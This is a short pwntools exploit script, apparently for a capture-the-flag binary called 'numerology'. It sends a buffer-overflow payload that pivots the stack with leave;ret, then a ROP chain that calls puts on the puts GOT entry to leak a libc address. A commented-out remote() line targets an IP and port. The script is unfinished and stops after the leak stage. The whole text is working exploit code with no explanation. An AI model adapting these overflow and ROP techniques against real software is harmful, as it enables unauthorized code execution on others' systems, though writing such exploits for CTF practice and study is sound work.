from pwn import *

# r = remote('143.255.251.233', 13373)
r = process('./numerology')
context.clear(os='linux', arch='x86_64', log_level='debug')
bin = ELF('./numerology')
buffer = 0x404e00

def who_are_you(name):
    r.sendafter(b'Who are you?: ', name)

pop_rdi_ret = 0x000000000040153b
jmp = 0x00000000004013be
leave_ret = 0x00000000004011fc

payload = b'a'*0x1c + p64(buffer) + p64(jmp)
gdb.attach(r, '''b*0x00000000004014a4''')
who_are_you(payload.ljust(0x30, b'\x00'))

payload = p64(pop_rdi_ret) + p64(bin.got['puts']) + p64(bin.plt['puts']) + \
        b'a'*4 + p64(buffer-8) + p64(leave_ret)
who_are_you(payload.ljust(0x30, b'\x00'))